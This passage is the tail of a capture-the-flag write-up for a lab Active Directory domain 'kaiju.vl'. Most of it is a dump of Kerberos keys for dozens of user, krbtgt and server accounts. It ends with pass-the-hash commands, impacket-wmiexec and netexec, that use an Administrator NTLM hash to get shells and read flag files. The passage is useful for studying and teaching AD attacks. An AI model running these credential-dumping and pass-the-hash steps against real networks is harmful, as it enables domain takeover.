kaiju.vl\Catherine.Wall:aes256-cts-hmac-sha1-96:f025e9d3dc4e9d54ccb99d3e0173366e0cb711a24b7f9f610f4d3f6ed47a55c6
kaiju.vl\Catherine.Wall:aes128-cts-hmac-sha1-96:a5781394818a3a89d29ad6536b7de56b
kaiju.vl\Catherine.Wall:des-cbc-md5:19c7d097139e2561
kaiju.vl\Jennifer.Brown:aes256-cts-hmac-sha1-96:65325484ffc6b4a1618fc96bcfa47cb0da34d6b8ee04e624f16d4e5d670683f4
kaiju.vl\Jennifer.Brown:aes128-cts-hmac-sha1-96:e304087049ae2a4c214a19c3df2f8be0
kaiju.vl\Jennifer.Brown:des-cbc-md5:089e6743d3b03457
kaiju.vl\Douglas.Smith:aes256-cts-hmac-sha1-96:17ca2fdcaef269f0a332ba5e4d5535d1bd3651275205789b0fab7ded6b8d3238
kaiju.vl\Douglas.Smith:aes128-cts-hmac-sha1-96:658f570d07cfbb6b3dba4b71bb21910f
kaiju.vl\Douglas.Smith:des-cbc-md5:3d386d152a38c8c4
kaiju.vl\Luke.Bradshaw:aes256-cts-hmac-sha1-96:5e5e7f7dc2aed83010dbd4c82c7bb673b69930e85d2163b8340181439ed6c243
kaiju.vl\Luke.Bradshaw:aes128-cts-hmac-sha1-96:45d2ab4bebf2e12a97d942b489512072
kaiju.vl\Luke.Bradshaw:des-cbc-md5:b65258cd34f7eaec
kaiju.vl\Natasha.Foster:aes256-cts-hmac-sha1-96:ee82e3e9ffef0ae6fa1fedbb4e3826f881b778bedc54480e46117ee2a9df07fc
kaiju.vl\Natasha.Foster:aes128-cts-hmac-sha1-96:60ed4f4355f0adb4bafa068808ef12a6
kaiju.vl\Natasha.Foster:des-cbc-md5:046b8a0d8a10bfd6
kaiju.vl\June.Edwards:aes256-cts-hmac-sha1-96:5513ea60d1d168398026ae9b95d0e618312d93ce35dd51ebc72a9a60e2309624
kaiju.vl\June.Edwards:aes128-cts-hmac-sha1-96:c9fdf0363146907099393564876f4d71
kaiju.vl\June.Edwards:des-cbc-md5:206eb0dfc1a74061
kaiju.vl\Kimberley.Richards:aes256-cts-hmac-sha1-96:8045ef6cbc14537a5199e1685b62e56b28d18daf4d0b404428cd60f01e0dc64d
kaiju.vl\Kimberley.Richards:aes128-cts-hmac-sha1-96:895a6d0de31c9be82c9babdeaa422055
kaiju.vl\Kimberley.Richards:des-cbc-md5:510e370d79042567
kaiju.vl\Gerald.Miller:aes256-cts-hmac-sha1-96:faa15702f697323ce8d8e78ec71053dbf60c1bea0b69bb911a703b186210749e
kaiju.vl\Gerald.Miller:aes128-cts-hmac-sha1-96:24c1892f7c2c4bbe61dbdb1e61fe421a
kaiju.vl\Gerald.Miller:des-cbc-md5:1097ba2a20c4f25b
kaiju.vl\Ashley.Davison:aes256-cts-hmac-sha1-96:3dd1ee4b34a079baf2153ff9b55440429aedd7d7bdf395b4fadff6713ad96c30
kaiju.vl\Ashley.Davison:aes128-cts-hmac-sha1-96:e859521ae04605799d27cf0ceea9644e
kaiju.vl\Ashley.Davison:des-cbc-md5:ae19fb803d739879
kaiju.vl\Martyn.Rogers:aes256-cts-hmac-sha1-96:e814dcc3c67ecf583fbeb71ae9cbc626cdac198d3f55556428885eb0720b18e2
kaiju.vl\Martyn.Rogers:aes128-cts-hmac-sha1-96:1e70769407558d4d9f08377ab70bc75f
kaiju.vl\Martyn.Rogers:des-cbc-md5:10d5c145ba3292cb
kaiju.vl\Kerry.Watson:aes256-cts-hmac-sha1-96:8d2a5ae40e4b2087465af22a1e5c040ab313ca742629e3cc9044c799642837f9
kaiju.vl\Kerry.Watson:aes128-cts-hmac-sha1-96:06af3120dfe59cd73efae6ba4974a57a
kaiju.vl\Kerry.Watson:des-cbc-md5:1998b5a7cb1cbf6b
kaiju.vl\Tracy.Pearson:aes256-cts-hmac-sha1-96:9bccc6415be8a4d48c8db894f8d1b8cf42693f032c9decd6b867fc77f85d2175
kaiju.vl\Tracy.Pearson:aes128-cts-hmac-sha1-96:bdda21535ecd12798df586a7813c7bdd
kaiju.vl\Tracy.Pearson:des-cbc-md5:4529451062ea5476
kaiju.vl\Vanessa.Nelson:aes256-cts-hmac-sha1-96:c996b74c0b30b739fd50437f6515c71a5fd44e488c750a2b6c96e07fd2891503
kaiju.vl\Vanessa.Nelson:aes128-cts-hmac-sha1-96:1a239f164f0d7383789349eb84725610
kaiju.vl\Vanessa.Nelson:des-cbc-md5:cd5bd50e5ed38f92
kaiju.vl\Barbara.Johnson:aes256-cts-hmac-sha1-96:86afcdc609bb82e984130ec46db7e348fdd006295b7e80c2d8be5b69817b28be
kaiju.vl\Barbara.Johnson:aes128-cts-hmac-sha1-96:a0eb8cdbde72ebc3947b69dd3b6fc3c4
kaiju.vl\Barbara.Johnson:des-cbc-md5:8a2a37205b0e2532
kaiju.vl\Marian.Willis:aes256-cts-hmac-sha1-96:d5974ded08f508454fc5e872de7d238063392e57b263d4f6edf1ea139eba0a22
kaiju.vl\Marian.Willis:aes128-cts-hmac-sha1-96:094f857b269fa94f82c26bd44b9d7c61
kaiju.vl\Marian.Willis:des-cbc-md5:809820cb31ba9b1c
kaiju.vl\Joel.Kelly:aes256-cts-hmac-sha1-96:b05083793e6c205c8e86f2c761b3e3ea368302ee17f345796ef8714ce382b6e6
kaiju.vl\Joel.Kelly:aes128-cts-hmac-sha1-96:df0eb7462ff25dfd692e1b48204a6b3f
kaiju.vl\Joel.Kelly:des-cbc-md5:2cda07f46eda4519
kaiju.vl\Kimberley.Bird:aes256-cts-hmac-sha1-96:8db29400f4707fba54b46d1175eb85a9d5885ff078e53d929553cda8eba86971
kaiju.vl\Kimberley.Bird:aes128-cts-hmac-sha1-96:bd71a541811218e5a86ab592b82c7542
kaiju.vl\Kimberley.Bird:des-cbc-md5:490de00bd53754b9
kaiju.vl\Elliott.Barker:aes256-cts-hmac-sha1-96:a27d986a31c6a1d455451fc24f67d01ea8f8ef2801d0c5b2203eb34d4fb3b37e
kaiju.vl\Elliott.Barker:aes128-cts-hmac-sha1-96:0434393122397d695f5a5034be227744
kaiju.vl\Elliott.Barker:des-cbc-md5:a1544ccb26feece9
kaiju.vl\Adrian.Simpson:aes256-cts-hmac-sha1-96:9f339ebfe0174073c9614430bb614ded1ed21c3e6a12737a3d9c7e838620c133
kaiju.vl\Adrian.Simpson:aes128-cts-hmac-sha1-96:76f93127994b20988fd6fedfd453c4ea
kaiju.vl\Adrian.Simpson:des-cbc-md5:1985a40ecd687097
kaiju.vl\Carolyn.Lewis:aes256-cts-hmac-sha1-96:cdc5c8487ba07b0cb631afb6424de52ca174882f9aaadc592954e259e753457e
kaiju.vl\Carolyn.Lewis:aes128-cts-hmac-sha1-96:de9a4697e21d750c82ebc36d15a69d74
kaiju.vl\Carolyn.Lewis:des-cbc-md5:f7d5868af746b013
kaiju.vl\Clare.Frost:aes256-cts-hmac-sha1-96:8a463763ed239383ce307fa73b302e6feb353cfbfc1dfc731d6315781fa3c605
kaiju.vl\Clare.Frost:aes128-cts-hmac-sha1-96:2be28f62aaa5f89f886371c8d2da3ab2
kaiju.vl\Clare.Frost:des-cbc-md5:5df85b1c86103d4a
kaiju.vl\Kate.Martin:aes256-cts-hmac-sha1-96:0d36d5d4d310db047b67ff334aaf01d9796ddf40483d22e986008d0e5e71ff45
kaiju.vl\Kate.Martin:aes128-cts-hmac-sha1-96:b746dd27db9bef826f1c09bd859a9db0
kaiju.vl\Kate.Martin:des-cbc-md5:0e0e6d70b56ed608
kaiju.vl\Wendy.Murphy:aes256-cts-hmac-sha1-96:c80f760254c35cab6bd3d2994a0ab8b71f7825fa2dcdc2c3fc657d2317863da5
kaiju.vl\Wendy.Murphy:aes128-cts-hmac-sha1-96:78d4b56d89361867f610f0014e9127d3
kaiju.vl\Wendy.Murphy:des-cbc-md5:49026e1573a42cec
kaiju.vl\Kevin.Webb:aes256-cts-hmac-sha1-96:e85f4a3fae04cbc7a1b7b51eb591bf62e1fdeba134a62c3578c4cdd46e3ddc96
kaiju.vl\Kevin.Webb:aes128-cts-hmac-sha1-96:aed4da34c8fd2a0c292067ff0f75b893
kaiju.vl\Kevin.Webb:des-cbc-md5:519dd9572fc1857a
kaiju.vl\Robert.Owen:aes256-cts-hmac-sha1-96:a676e2551651e417da2f24b98ae50d9532f626682ca0e35145e6c1875396fe9f
kaiju.vl\Robert.Owen:aes128-cts-hmac-sha1-96:c2682e98053e6c7d9197762be8ac6582
kaiju.vl\Robert.Owen:des-cbc-md5:f15e7364ef31df83
kaiju.vl\Suzanne.Baldwin:aes256-cts-hmac-sha1-96:b344851e33e2639311695b6f6236a86e9e2570ae9a004c2602d1529bedd694c2
kaiju.vl\Suzanne.Baldwin:aes128-cts-hmac-sha1-96:6f775d4d2ff2a4f5b207675a9c95bc7a
kaiju.vl\Suzanne.Baldwin:des-cbc-md5:7fc1617c10796ef2
kaiju.vl\Jason.Spencer:aes256-cts-hmac-sha1-96:4057d719985da4fa4e7632d97abd52985b75d9b6331cc7a198638784e2742ee1
kaiju.vl\Jason.Spencer:aes128-cts-hmac-sha1-96:01da0f32dbc4319fca0440c7c3583d1a
kaiju.vl\Jason.Spencer:des-cbc-md5:9870ce1573850416
kaiju.vl\Ian.Reeves:aes256-cts-hmac-sha1-96:fd83284e7a20620369cc8fd0216a438c1dc9132c2ccb708acb6ecaab4e20f99a
kaiju.vl\Ian.Reeves:aes128-cts-hmac-sha1-96:d95cbdcc571edeaa3af9ced2cf77002b
kaiju.vl\Ian.Reeves:des-cbc-md5:df5e5b6e6223ab02
kaiju.vl\Sara.Shaw:aes256-cts-hmac-sha1-96:ca8403e24233011798a5cf34638d41395c8c60b01f4d426a9338d0e4b4bf9737
kaiju.vl\Sara.Shaw:aes128-cts-hmac-sha1-96:eea19cd827150bbecfe4f73050afb7e8
kaiju.vl\Sara.Shaw:des-cbc-md5:ea2326fbe5850e75
kaiju.vl\Callum.Smith:aes256-cts-hmac-sha1-96:d774d00daf18b17f7d54856852c163295b8dcb3a6a87382f1c3a748bf7cfd11b
kaiju.vl\Callum.Smith:aes128-cts-hmac-sha1-96:812ddaf4029e17b3ca50a491201c5e08
kaiju.vl\Callum.Smith:des-cbc-md5:137cf4a1ecea611a
kaiju.vl\Stewart.Powell:aes256-cts-hmac-sha1-96:d945114e6dad2df87865197d0b3a1375ef9258414c970b766fd92cf28a5e8edd
kaiju.vl\Stewart.Powell:aes128-cts-hmac-sha1-96:8b0cfb3550422dd42f53c07b250b081a
kaiju.vl\Stewart.Powell:des-cbc-md5:1979e6ab19e98698
kaiju.vl\Paula.Matthews:aes256-cts-hmac-sha1-96:d48e5eff5d1b3c894f493405156f26652c751d5c3d783d34cda81756f9b25380
kaiju.vl\Paula.Matthews:aes128-cts-hmac-sha1-96:d20475e599f5666520ab754cbfa6201c
kaiju.vl\Paula.Matthews:des-cbc-md5:2580bfbfe6d9862f
kaiju.vl\Michael.Ball:aes256-cts-hmac-sha1-96:5b301c49558e94dacdfc68bcddf91c522126da7fc507245d7e1eaf700978ac63
kaiju.vl\Michael.Ball:aes128-cts-hmac-sha1-96:78f751dbcae5e10812525cd0f9775953
kaiju.vl\Michael.Ball:des-cbc-md5:a84075682a10207c
kaiju.vl\Amelia.Ali:aes256-cts-hmac-sha1-96:6508d8711ada51f2ede7a8bfd85912c4deea7dc9dbb190246c912723b5f4b9bb
kaiju.vl\Amelia.Ali:aes128-cts-hmac-sha1-96:e207391d82486de47d78f60748a266cf
kaiju.vl\Amelia.Ali:des-cbc-md5:e5a17a08f4eca1ba
kaiju.vl\Dylan.Jones:aes256-cts-hmac-sha1-96:cc2018c47f2a69029f5bed84f3a6036352f6134b1f002b3bc99e4d1f34b349c4
kaiju.vl\Dylan.Jones:aes128-cts-hmac-sha1-96:2fc2ba2681819e70203037f5d2bf4058
kaiju.vl\Dylan.Jones:des-cbc-md5:4c04d68f0dd3162c
kaiju.vl\Jeffrey.Whittaker:aes256-cts-hmac-sha1-96:ea429c0c851b3745010c4337518d7d0165da20c7259f934f2fc7a44873f76baf
kaiju.vl\Jeffrey.Whittaker:aes128-cts-hmac-sha1-96:922c9886612f2d646d753349e6d1c10d
kaiju.vl\Jeffrey.Whittaker:des-cbc-md5:5b9201756be0bf97
kaiju.vl\Kirsty.Smart:aes256-cts-hmac-sha1-96:929283b7399ec65e9a9ebb1c3573034b99222afba922e8640fc669b55e60acc1
kaiju.vl\Kirsty.Smart:aes128-cts-hmac-sha1-96:9379eade6ea35f8be498a9d8dfd9ec0c
kaiju.vl\Kirsty.Smart:des-cbc-md5:29a745ab5bea3713
kaiju.vl\Sharon.Taylor:aes256-cts-hmac-sha1-96:7cf0156c475ff275cce0f2a7b328dda01400652785b7daecaa4e9afcd382e946
kaiju.vl\Sharon.Taylor:aes128-cts-hmac-sha1-96:adab3064d837534ac665532a2ec120f7
kaiju.vl\Sharon.Taylor:des-cbc-md5:d9026db9ec673b01
kaiju.vl\Jeremy.Tucker:aes256-cts-hmac-sha1-96:901da80f2898ad5a09082fa7fb1c68114871f73457f0ee2f365e91127a12781b
kaiju.vl\Jeremy.Tucker:aes128-cts-hmac-sha1-96:d5c914a5de221033c24b5757b70b1595
kaiju.vl\Jeremy.Tucker:des-cbc-md5:d01034f101e90ddc
kaiju.vl\Gemma.Jackson:aes256-cts-hmac-sha1-96:fe0b09f655b286114284555498289fbef124db8b5c146f8a7d2370e36f8e1685
kaiju.vl\Gemma.Jackson:aes128-cts-hmac-sha1-96:1abfff1e298d41c164c4fcb126655820
kaiju.vl\Gemma.Jackson:des-cbc-md5:199e0b94fe0b8a16
kaiju.vl\Abigail.Greenwood:aes256-cts-hmac-sha1-96:d027484462ac0bd435456620daa9e4ece6f7a1570de8f863bcb477f91d9136cd
kaiju.vl\Abigail.Greenwood:aes128-cts-hmac-sha1-96:b97ae620c95b0cde9a305ce02d31f2ab
kaiju.vl\Abigail.Greenwood:des-cbc-md5:5bf24513b90867e9
kaiju.vl\Simon.Clark:aes256-cts-hmac-sha1-96:9e98b95ad4058751a36c8f063e553daa82343780a0c0649583c20ba7be6c2b58
kaiju.vl\Simon.Clark:aes128-cts-hmac-sha1-96:b4b07fba6721c689f52620470f70c052
kaiju.vl\Simon.Clark:des-cbc-md5:04d5583df7985ee6
kaiju.vl\Hollie.Edwards:aes256-cts-hmac-sha1-96:6ad5568c36a5621530fe550c34197fb8aa4a5c47f56368a5ae016cfd088f551f
kaiju.vl\Hollie.Edwards:aes128-cts-hmac-sha1-96:d3f92080ebb47110ca4bf66e03b7ef41
kaiju.vl\Hollie.Edwards:des-cbc-md5:5125dce5c431e6b5
kaiju.vl\Darren.Parker:aes256-cts-hmac-sha1-96:deb666131575f84b8ae470c1cfb89b4877c5357358ff21ea188f96dad330c602
kaiju.vl\Darren.Parker:aes128-cts-hmac-sha1-96:65afca57f3f929cf7c500739728300e8
kaiju.vl\Darren.Parker:des-cbc-md5:b6543e5ba7734685
kaiju.vl\Nicole.Morris:aes256-cts-hmac-sha1-96:79157a320d359cc7278ef7472962172455c4503a0eaa41a160fcd53e55269a37
kaiju.vl\Nicole.Morris:aes128-cts-hmac-sha1-96:c5d2009a9457ccc1f1fa862980495954
kaiju.vl\Nicole.Morris:des-cbc-md5:6eef1cbac47ca749
kaiju.vl\Stephanie.Griffiths:aes256-cts-hmac-sha1-96:29d41712073413c64846b169435b5e90b98c7bbd997ac56c3a9812c5b9a60dcd
kaiju.vl\Stephanie.Griffiths:aes128-cts-hmac-sha1-96:73f8e563f7443073d47e6e34122dd76f
kaiju.vl\Stephanie.Griffiths:des-cbc-md5:b5ad0e02c11a92e3
kaiju.vl\Robert.Reeves:aes256-cts-hmac-sha1-96:0e51650f9dd7bee43a92fc7dd9104523f3dcde61a2a11ff78b80c2c2b188204c
kaiju.vl\Robert.Reeves:aes128-cts-hmac-sha1-96:a1e8ac1aa22fe0d9d53b4bcfdf5de105
kaiju.vl\Robert.Reeves:des-cbc-md5:13ea6dba68257a29
kaiju.vl\Marie.Hall:aes256-cts-hmac-sha1-96:47eb94bada5c2b133c2b4a34ed8cc28ed1a8a3767c68e8db8973d83289d8c89c
kaiju.vl\Marie.Hall:aes128-cts-hmac-sha1-96:bb3c0dd273f84a06e1ce60c434e4785f
kaiju.vl\Marie.Hall:des-cbc-md5:753dd9da5b23e39b
kaiju.vl\Barbara.Gray:aes256-cts-hmac-sha1-96:71d5afb69d2c6d26c286ca33b69e6cc2e742b38d2cb3d525a81f5b6c08a74846
kaiju.vl\Barbara.Gray:aes128-cts-hmac-sha1-96:3500eb1b0b8db34e610512dff2e5c090
kaiju.vl\Barbara.Gray:des-cbc-md5:32104fd55d5d75ef
kaiju.vl\Damien.Page:aes256-cts-hmac-sha1-96:830dace986f9d0d201a452d892472f3ee56d1a0196efdc2addf768815655677b
kaiju.vl\Damien.Page:aes128-cts-hmac-sha1-96:a41f6877598a2e87d2499b1f3b2847c3
kaiju.vl\Damien.Page:des-cbc-md5:310e4c75c1839854
kaiju.vl\Ruth.Harrison:aes256-cts-hmac-sha1-96:a605b7d666557016fe1d9004ad9a3c4ceb0acab14cdc622942888181193808a1
kaiju.vl\Ruth.Harrison:aes128-cts-hmac-sha1-96:bd2c8eb8cc0c9219d3f377d114a2fef1
kaiju.vl\Ruth.Harrison:des-cbc-md5:b3a18094f84523ae
kaiju.vl\Jake.Middleton:aes256-cts-hmac-sha1-96:023a8f6e9f56165a925d22f6239d744efb976873481a6740cace682b2ee6f322
kaiju.vl\Jake.Middleton:aes128-cts-hmac-sha1-96:c546a250857d0d9b718c4a44c08461aa
kaiju.vl\Jake.Middleton:des-cbc-md5:4c768634401af832
kaiju.vl\Paul.Newman:aes256-cts-hmac-sha1-96:e6ce96d8408aa9629216a9825e053747f17d354681d0fcf4a13785c9fd4152e5
kaiju.vl\Paul.Newman:aes128-cts-hmac-sha1-96:a1ac7cea294b5b4706b8c995d6480e6d
kaiju.vl\Paul.Newman:des-cbc-md5:e99edfb5dc9797bc
kaiju.vl\Paula.Jackson:aes256-cts-hmac-sha1-96:d324a1101d0fa4a4d44090bbae3e7cc308fef3cc52b5844d2ef3a08ce25900e9
kaiju.vl\Paula.Jackson:aes128-cts-hmac-sha1-96:a6aa3de11cdcaf26be951dd5a41e3a9d
kaiju.vl\Paula.Jackson:des-cbc-md5:462a151a23838f2a
kaiju.vl\Jean.Robinson:aes256-cts-hmac-sha1-96:688166b95000c50bdc7df82f202355d47c426d0a18d67fd66bcf0f9175367088
kaiju.vl\Jean.Robinson:aes128-cts-hmac-sha1-96:05b16cb92485b05ce8f441fc7f0b09e2
kaiju.vl\Jean.Robinson:des-cbc-md5:e5f7f47f4a206797
kaiju.vl\James.Tucker:aes256-cts-hmac-sha1-96:b2f49a09e4837f48d690d25ea5d4fe553cb51b942f649b897e05d9139617fe2c
kaiju.vl\James.Tucker:aes128-cts-hmac-sha1-96:9e995f85a1edb46f0cb61f5639f1a9b0
kaiju.vl\James.Tucker:des-cbc-md5:ec25cb8329611fb6
kaiju.vl\Duncan.Williams:aes256-cts-hmac-sha1-96:6b5738d633da8fe8174ba6ba8cb5705a3115498f1f28dab0fb68352efb25097a
kaiju.vl\Duncan.Williams:aes128-cts-hmac-sha1-96:c006e9e73bd037d314896c569dfca3a9
kaiju.vl\Duncan.Williams:des-cbc-md5:dc2aa28c38d9c286
kaiju.vl\Gregory.Shah:aes256-cts-hmac-sha1-96:6bd18b1e88cbb11cfc5bd2f2be3d0444498d9dd687294ae9d17479d951d110c8
kaiju.vl\Gregory.Shah:aes128-cts-hmac-sha1-96:09413e87c7fcb3d96c47fb12dd6dff07
kaiju.vl\Gregory.Shah:des-cbc-md5:d0cec197b6fdec7a
kaiju.vl\Jeremy.Wilson:aes256-cts-hmac-sha1-96:29c189c8fd51e5128bf5cc063c26d49161b9a9b1d0cb95f0cc023c77433eeca0
kaiju.vl\Jeremy.Wilson:aes128-cts-hmac-sha1-96:f66ebc76cffbf3c1c11c692db0d4dff2
kaiju.vl\Jeremy.Wilson:des-cbc-md5:15510dd051f4ab6d
kaiju.vl\Terry.Smith:aes256-cts-hmac-sha1-96:038f88aa2c3bd758f2ad20ef1bf236f7509a8fd57230b186906ef5e377f4c74d
kaiju.vl\Terry.Smith:aes128-cts-hmac-sha1-96:98310fec754eb494b81f284cdf961db4
kaiju.vl\Terry.Smith:des-cbc-md5:3ecb7f9d80a8649d
kaiju.vl\Gillian.Fletcher:aes256-cts-hmac-sha1-96:e3e21feb9041b6ba55ba31ff68d5d72f0cf1965fdfddb443ee428c72b5aabf58
kaiju.vl\Gillian.Fletcher:aes128-cts-hmac-sha1-96:49e33f19200bf872893cfc409f3deba3
kaiju.vl\Gillian.Fletcher:des-cbc-md5:8ac74a0b0240a102
kaiju.vl\Clifford.Jordan:aes256-cts-hmac-sha1-96:4daa10b45277dcec303759d7db098a4dc6e92931ddf242fa77d08b7b861643b3
kaiju.vl\Clifford.Jordan:aes128-cts-hmac-sha1-96:90ce9446f154842a13be46b754704706
kaiju.vl\Clifford.Jordan:des-cbc-md5:f16b64a7a2d5cd02
kaiju.vl\Billy.Perkins:aes256-cts-hmac-sha1-96:1614565fa0f003810de3005d17e793b615eafdfb8ce6be3a96a850ad69f2cc62
kaiju.vl\Billy.Perkins:aes128-cts-hmac-sha1-96:b6516b9a8f82e72f68efa97b53ad57d6
kaiju.vl\Billy.Perkins:des-cbc-md5:e9d9e03e8cf2fb7c
kaiju.vl\Josephine.Holmes:aes256-cts-hmac-sha1-96:86dd3b663a260b66c8ddaa1c01210088c4ef5b7dbb9616c11a9efa36c4c3cef0
kaiju.vl\Josephine.Holmes:aes128-cts-hmac-sha1-96:040681cf2cebf95a7619c60543a80294
kaiju.vl\Josephine.Holmes:des-cbc-md5:ef6b6e9443e5b975
kaiju.vl\Jack.Bray:aes256-cts-hmac-sha1-96:e254152364b1792bafa154fcd3c5d50653cac791a0af92c7649e30020ad46fc0
kaiju.vl\Jack.Bray:aes128-cts-hmac-sha1-96:0bb315dbf8257c21753ed009b347a255
kaiju.vl\Jack.Bray:des-cbc-md5:b6ec7031494c9883
kaiju.vl\Bernard.Griffiths:aes256-cts-hmac-sha1-96:3f360e2971aa2b18811a069ccb6323b38c7cb543ba76893f35ca971b2d59c5e7
kaiju.vl\Bernard.Griffiths:aes128-cts-hmac-sha1-96:eafe37c109ca328f644f5c49d859b14d
kaiju.vl\Bernard.Griffiths:des-cbc-md5:2aa21ab39d319bf7
kaiju.vl\Laura.Wright:aes256-cts-hmac-sha1-96:16944f1f02069e46918d18e11f4cfa669ce4e7656b508991bb6e69165d1840f7
kaiju.vl\Laura.Wright:aes128-cts-hmac-sha1-96:7c5bf8a296938efe44d052a75d612fc9
kaiju.vl\Laura.Wright:des-cbc-md5:89587f7fb90773c7
kaiju.vl\Albert.Harvey:aes256-cts-hmac-sha1-96:7c7f4696809876fcd5a1bd03b268cb370d1196e7bcb8ceaef884fba04ef81e8a
kaiju.vl\Albert.Harvey:aes128-cts-hmac-sha1-96:225f0f4c1351ef738b95c0fa90b9c513
kaiju.vl\Albert.Harvey:des-cbc-md5:91ec7643263b9480
kaiju.vl\Sheila.Davidson:aes256-cts-hmac-sha1-96:a787e74aab80320a854132ecbe5a4b13c5db97a4d85a9f59af62ae4106fba621
kaiju.vl\Sheila.Davidson:aes128-cts-hmac-sha1-96:60680f94756dfda78d60a84fd8111245
kaiju.vl\Sheila.Davidson:des-cbc-md5:dca8b36dc862899e
kaiju.vl\Damien.Bull:aes256-cts-hmac-sha1-96:811879ea32f70562b0c44042c2bb9075b9634316ceca9f5f0441458ee731dd03
kaiju.vl\Damien.Bull:aes128-cts-hmac-sha1-96:751cc5d72bcee7a5aae5689c9c4473f3
kaiju.vl\Damien.Bull:des-cbc-md5:cd6b73fb5ecec485
kaiju.vl\John.Chapman:aes256-cts-hmac-sha1-96:643ab6212ff2b7af72f395f7c831e1a7dd4c70256c0026072048724be38d44be
kaiju.vl\John.Chapman:aes128-cts-hmac-sha1-96:e2852d49113eefdaf2b7300ae1a7b5b5
kaiju.vl\John.Chapman:des-cbc-md5:a2643ee626e01cab
kaiju.vl\Janice.Bibi:aes256-cts-hmac-sha1-96:fbd62b6017bd8665d658a307d14c56b2a9fd8588a6daf9c1107ce8233f030e7f
kaiju.vl\Janice.Bibi:aes128-cts-hmac-sha1-96:4a624f00a1a6b39c113c28d00095a090
kaiju.vl\Janice.Bibi:des-cbc-md5:7c15a7e552e94f7c
kaiju.vl\ldapsvc:aes256-cts-hmac-sha1-96:f12bfeb47c54d1dc603007cad86873e32af0b219acd3f4ce415d7d0abfe4169c
kaiju.vl\ldapsvc:aes128-cts-hmac-sha1-96:1af5a1866596471669e5f2a4d847d0fb
kaiju.vl\ldapsvc:des-cbc-md5:834961ea31ad16fd
krbtgt_2450:aes256-cts-hmac-sha1-96:fa1712f280f4d2969765d812b523b244df9e3a6a26d13c07c3a3bf64a74a2ffb
krbtgt_2450:aes128-cts-hmac-sha1-96:260787565d1946105d2e5d6e850a898c
krbtgt_2450:des-cbc-md5:75df523e52d93d3d
BERSRV100$:aes256-cts-hmac-sha1-96:cab52dfa296c5db4e480f5719b996b6f84d64a9f4b43eba913826ba8576e8dad
BERSRV100$:aes128-cts-hmac-sha1-96:7795ee0613ab05ee7a1b04ea8f6d0232
BERSRV100$:des-cbc-md5:0b863b7a8a13f2d6
BERSRV200$:aes256-cts-hmac-sha1-96:4679f53c16571e95008a89659a9f8421429fd94927e3dc3b46d1cea492bcff2a
BERSRV200$:aes128-cts-hmac-sha1-96:a9f44bcb69f7ba754331ed35f91f55b6
BERSRV200$:des-cbc-md5:8325b6b0fe269464
BERSRV105$:aes256-cts-hmac-sha1-96:e7ff4e9b19ba97a602ef1e6be27e5d7ff8a0118fa46915a1a4db267981e496a8
BERSRV105$:aes128-cts-hmac-sha1-96:5c5bb179dd9aec92f881faad5d3b4506
BERSRV105$:des-cbc-md5:2cdf858651cb7620
[*] Cleaning up... 

```

## Getflag
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# proxychains -q impacket-wmiexec \                     
      -hashes aad3b435b51404eeaad3b435b51404ee:0b46720476be1abfbb3282cb80054f40 \
      'kaiju.vl/Administrator@172.16.90.61' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd C:\Users\Administrator.KAIJU\Desktop

C:\Users\Administrator.KAIJU\Desktop>type flag.txt
KAIJU{8ff0b2837bf36e509ad4d0acffa217bc}
```

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# proxychains -q netexec smb 172.16.90.60 172.16.90.61 \
      -u Administrator -d kaiju.vl \                                             
      -H 0b46720476be1abfbb3282cb80054f40 \
      -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         172.16.90.61    445    BERSRV105        [*] Windows Server 2022 Build 20348 x64 (name:BERSRV105) (domain:kaiju.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.90.60    445    BERSRV100        [*] Windows Server 2022 Build 20348 x64 (name:BERSRV100) (domain:kaiju.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.90.61    445    BERSRV105        [+] kaiju.vl\Administrator:0b46720476be1abfbb3282cb80054f40 (Pwn3d!)
SMB         172.16.90.61    445    BERSRV105        [+] Executed command via wmiexec
SMB         172.16.90.61    445    BERSRV105        The system cannot find the file specified.
SMB         172.16.90.60    445    BERSRV100        [+] kaiju.vl\Administrator:0b46720476be1abfbb3282cb80054f40 (Pwn3d!)
SMB         172.16.90.60    445    BERSRV100        [+] Executed command via wmiexec
SMB         172.16.90.60    445    BERSRV100        KAIJU{5fc3687d5d1d61df95291929a93f14c5}
```





